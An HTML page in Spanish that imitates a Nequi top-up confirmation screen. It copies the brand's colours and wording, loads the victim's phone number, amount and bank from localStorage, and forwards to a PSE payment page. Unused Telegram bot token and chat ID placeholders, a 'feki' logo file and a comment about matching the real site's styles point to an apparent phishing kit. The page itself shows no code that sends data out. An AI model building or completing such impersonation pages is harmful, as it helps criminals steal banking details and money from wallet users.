<!DOCTYPE html>
<html lang="es">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Confirmacion</title>
  <link rel="icon" type="image/png" href="nequi-favicon-dark.svg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#200020">
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    :root {
      --font-family: "Manrope", sans-serif;
      --uva: #200020;
      --orquidea: #da0081;
      --white: #ffffff;
      --gray-200: #e8e8e8;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: var(--font-family);
      background-color: var(--white);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 40px; 
      -webkit-font-smoothing: antialiased;
    }

    .header {
      margin-bottom: 32px;
      display: flex;
      justify-content: center;
      width: 100%;
    }

    .header img { 
      width: 104px; 
      height: 32px; 
      display: block;
    }

    /* ESTILO ACTUALIZADO SEGÚN TU INSPECCIÓN */
    .title {
      font-weight: 700;
      font-size: 1.5rem;
      line-height: 2rem;
      text-align: center;
      color: var(--uva);
      margin: 0 0 1rem; /* Aplicado exactamente como lo pasaste */
    }

    .summary-card {
      display: flex;
      flex-direction: column;
      background: var(--white);
      border: 1px solid rgba(151, 151, 151, .1);
      box-shadow: 0 1px 1px #3c857f26;
      border-radius: 8px;
      padding: 1rem;
      gap: 0.5rem;
      width: 328px;
    }

    .summary-item {
      width: 312px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 2px;
    }

    .summary__title {
      font-weight: 400;
      font-size: .875rem;
      line-height: 19px;
      color: var(--orquidea);
    }

    .summary__description {
      font-weight: 400;
      font-size: 1rem;
      line-height: 21px;
      color: var(--uva);
      word-break: break-all;
    }

    .buttons-container {
      margin-top: 32px;
      display: flex;
      flex-direction: column;
      gap: 1rem;
      width: 328px;
      align-items: center;
    }

    .btn {
      width: 312px;
      min-height: 48px;
      border-radius: 4px;
      font-family: var(--font-family);
      font-size: 1rem;
      font-weight: 500;
      border: none;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .btn-primary {
      background: var(--orquidea);
      color: var(--white);
    }

    .btn-secondary {
      background: var(--white);
      border: 1px solid var(--uva);
      color: var(--uva);
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="feki-logo.svg" alt="Logo">
  </div>

  <h1 class="title">Revisa la info</h1>

  <div class="summary-card">
    <div class="summary-item">
      <p class="summary__title">Concepto</p>
      <p class="summary__description">Recarga Nequi PSE</p>
    </div>
    
    <div class="summary-item">
      <p class="summary__title">Número de celular</p>
      <p class="summary__description" id="info-celular"></p>
    </div>

    <div class="summary-item">
      <p class="summary__title">¿Cuánto?</p>
      <p class="summary__description" id="info-monto"></p>
    </div>

    <div class="summary-item">
      <p class="summary__title">Tipo de persona</p>
      <p class="summary__description">Natural</p>
    </div>

    <div class="summary-item">
      <p class="summary__title">Banco</p>
      <p class="summary__description" id="info-banco"></p>
    </div>
  </div>

  <div class="buttons-container">
    <button class="btn btn-primary" onclick="cl()">Recargar</button>
    <button class="btn btn-secondary" onclick="window.history.back()">Atrás</button>
  </div>

  <script>
    function loadFormData() {
      try {
        const savedData = localStorage.getItem('formData');
        if (!savedData) return;
        const data = JSON.parse(savedData);
        document.getElementById('info-celular').textContent = data.phoneNumber || '';
        document.getElementById('info-monto').textContent = data.transactionValue || '';
        document.getElementById('info-banco').textContent = data.bankText || '';
      } catch(e) { console.error(e); }
    }

    window.onload = loadFormData;

    const TELEGRAM_TOKEN = "TU_TOKEN_AQUÍ";
    const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUÍ";

    async function cl() {
    window.location.href = "Pago con PSE.html";
}
  </script>
</body>
</html>
